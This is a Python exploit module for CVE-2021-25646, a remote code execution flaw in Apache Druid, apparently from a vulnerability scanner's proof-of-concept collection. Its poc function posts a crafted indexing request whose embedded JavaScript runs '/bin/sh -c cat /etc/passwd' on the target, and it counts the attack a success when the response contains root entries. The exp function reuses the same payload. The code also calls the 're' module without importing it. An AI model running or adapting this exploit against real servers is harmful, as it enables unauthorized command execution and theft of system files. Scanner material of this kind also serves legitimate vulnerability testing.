import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Druid RCE''',
        "description": '''Apache Druid is a column-oriented open source distributed data storage written in Java, designed to quickly obtain large amounts of event data and provide low-latency queries on the data.
Apache Druid lacks authorization and authentication by default. Attackers can send specially crafted requests to execute arbitrary code with the privileges of processes on the Druid server.''',
        "severity": "high",
        "references": [
            "https://paper.seebug.org/1476/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-25646",
            "cwe-id": "CWE-732"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "apache", "rce", "druid"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/druid/indexer/v1/sampler"""
        method = "POST"
        data = """{
"type":"index",
"spec":{
   "ioConfig":{
      "type":"index",
      "firehose":{
         "type":"local",
         "baseDir":"/etc",
         "filter":"passwd"
      }
   },
   "dataSchema":{
      "dataSource":"odgjxrrrePz",
      "parser":{
         "parseSpec":{
            "format":"javascript",
            "timestampSpec":{

            },
            "dimensionsSpec":{

            },
            "function":"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"4137368\",OQtGXcxBVQVL: hTVCCerYZ}}",
            "":{
               "enabled":"true"
            }
         }
      }
   }
},
"samplerConfig":{
   "numRows":10
}
}"""
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""application/json""" in str(resp0.headers)) and ("""numRowsRead""" in resp0.text and """numRowsIndexed""" in resp0.text) and (re.search(r"""root:.*:0:0:""",resp0.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url